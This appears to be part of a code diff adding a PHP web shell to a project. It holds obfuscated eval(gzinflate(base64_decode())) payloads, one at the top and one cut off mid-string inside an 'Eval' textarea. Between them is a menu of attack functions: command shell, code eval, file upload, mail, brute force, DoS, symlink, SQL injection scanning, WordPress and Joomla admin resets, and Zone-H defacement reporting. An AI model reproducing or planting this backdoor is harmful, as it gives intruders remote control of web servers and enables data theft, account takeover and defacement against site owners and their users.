+								<? eval(gzinflate(base64_decode('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'))); ?>
+							</tr>
+						</table>
+					</td> 
+					<td>
+						<?php echo $buff; ?>
+					</td> 
+				</tr>
+			</table>	
+		</div> 
+		<!-- head info end here --> 
+   		<!-- menu start --> 
+      		<div id="menu"> 
+            <center>
+			<a href="?<?php echo "y=".$pwd; ?>">			<b>Explore</b></a> 
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=shell">	<b>Shell</b></a> 
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=php">		<b>Eval</b></a> 
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=mysql">	<b>MySQL</b></a> 
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo">	<b>PHP</b></a> 
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit">	<b>NetSploit</b></a> 
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=upload">	<b>Upload</b></a> 
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=mail">		<b>Mail</b></a> 
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=brute">	<b>BruteForce</b></a> 
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=readable">	<b>OpenDIR</b></a> 
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=dos">		<b>D0S</b></a><br><br>
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=localdomain">	<b>LocalDomain</b></a> 
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=zone-h">        <b>Zone-H</b></a>
+            <a href="?<?php echo "y=".$pwd; ?>&amp;x=symlink">        <b>Symlink</b></a>
+            <a href="?<?php echo "y=".$pwd; ?>&amp;x=identify">        <b>Domain Script</b></a> 
+            <a href="?<?php echo "y=".$pwd; ?>&amp;x=sqli-scanner">        <b>SQLI Scan</b></a> 
+            <a href="?<?php echo "y=".$pwd; ?>&amp;x=web-info">        <b>Website Whois</b></a> 
+            <a href="?<?php echo "y=".$pwd; ?>&amp;x=port-scanner">        <b>Port-Scanner</b></a> 
+            <a href="?<?php echo "y=".$pwd; ?>&amp;x=wp-reset">        <b>WP Reset</b></a><br><br> 
+            <a href="?<?php echo "y=".$pwd; ?>&amp;x=jm-reset">        <b>Jomlaa Reset</b></a> 
+            <a href="?<?php echo "y=".$pwd; ?>&amp;x=cms-scanner">        <b>CMS Scanner</b></a> 
+            <a href="?<?php echo "y=".$pwd; ?>&amp;x=vb">        <b>VB Changer</b></a> 
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=string-encode">        <b>String Encoder</b></a>
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=mysqlbackup">	<b>SQL Backup</b></a>
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=whmcs">        <b>WHMCS Decoder</b></a>
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=security-mode">        <b>Security Mode</b></a>
+			<a href="?<?php echo "y=".$pwd; ?>&amp;x=process">        <b>Process</b></a> 
+            </center>
+		</div>
+     		<!-- menu end -->
+            
+            
+		<?php 
+		if(isset($_GET['x']) && ($_GET['x'] == 'php'))
+			{ 
+			?> 
+<form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post"> 
+<table class="cmdbox"> 
+
+<tr>
+<td>
+<textarea class="output" name="cmd" id="cmd"><? eval(gzinflate(base64_decode('FZfHsoPYFUV/xbNuFwNyKtvdRc45M3GRcxBJwNdb1uhVSUg87jl7r/X3X//++x/VlY1/Nm8312N2VH/ux/bfbTlg9M882ysC+29ZFUtZ/fmHmK4BT9ofMfHBEJlwwTkO96MWUH6tGWu739qt6hmlcqsQ2Y2G3v1L7RcIkCgIgKO7rxdc0+VpeSp44iGYXxfezdGQgN6RHLjOgMMnAIIqqEFYioIZr4DXjZu6kaVHzEh6rSxLqDcP8gixjF0msxYFYk9pZV6ZVTDcgS0sOhSjcRQhBHR/qkohI/0BwdokHYPIufFv0JZqLlJGPpZqwzDbMZ+Y3I8slQK8OclaE1hv6yh2DoE8tPn2kxJw7jAvDNtFgKPA5/5cx0SMRHsIp7Ai2FBXsFLQ9A3rW5LNOMQk2lPU+DpmM6XIJPOcEvWshHvX9WNb7mMdafviD2JBvNMJw5pwk2Xt/lfCMNJHjuDGH/l0ElWirAoLr9wMnrqf95z2lCOXgn6F0CT2/fvAt9ujZKgXDpla9JqbBoJ47vh4K/82PlC/EvTq2Bf2kO8smhaXzxs2yzwPJKI/QBabEoKyrL/3nJrXdNR/WErpv8V9AJr9mLtLELthbznczWg8XhUG88/qQ1HofQz2xWrFN26qbKrYNh2T+BK7qo5Z19wIH9sTY1I5jhbuJfaZGXUiyKKhUwyaus1xUFlZBpetenLKMRQcnfc8z9vKM4hpxuKYc3ci7nCIW9fpobdQJMNGx+rysJfniz3qlfghUTgtPOBISldYNtDzN8BnFtXS4E1Olv79ynmCKPl010HE+JwYi7nvE03Qo3Mt/KaWY1bUdgtMjUpgycdXC8prQ/
+pjkqhApIKjypJ4NTPdrFVNAtf27JwnFJUPuQHOaP1mFNge1g2oiEmyxGe1BEMxZTypful5XeGoYmKB5QtJE+aOZcSlfM3VCHhOvfd+2HGdUoDFM9Zypu1GiOw1R68CtEvzUVIp4KKCR3Vof8y+S1ZXxVY/FnFmpbTg1PoOPIazSyvZ30FkDg+DvEgwa7O3tB5PNDxeipzuw2jFJchbTIa4Hs6bXfvjlYZhoTstMkb1uRsz58WWMWjRFyIcmRsT4KxKCG0QYEXFkCYqGmpcJ3wG+z4Yy9kYVg+VyzIjsvI3CnQ2mJVQPGEYC/Cy3vFjRAoID4XuWvyUY6l8fbB1S9eKDdXOUBJtAvySHDg2aZI6Z/4MkVXTt20UqnALPgwPq7z3FRl5d2+doBimSEVD5dAduiqpJIvv1SSSTxzmgtUJiRiHMD2FJJv0J7lF5bmIqNmS33EuA6IH+xDMECpfmf49vKN9VWmdXSvkXYTwH10hozClHHPnon1CAem89NE4aEv6muTv5yU6njOkwumrbUwIQ5NJTOVfVARUjmB5OsNH5w3e6O2V94G4yYc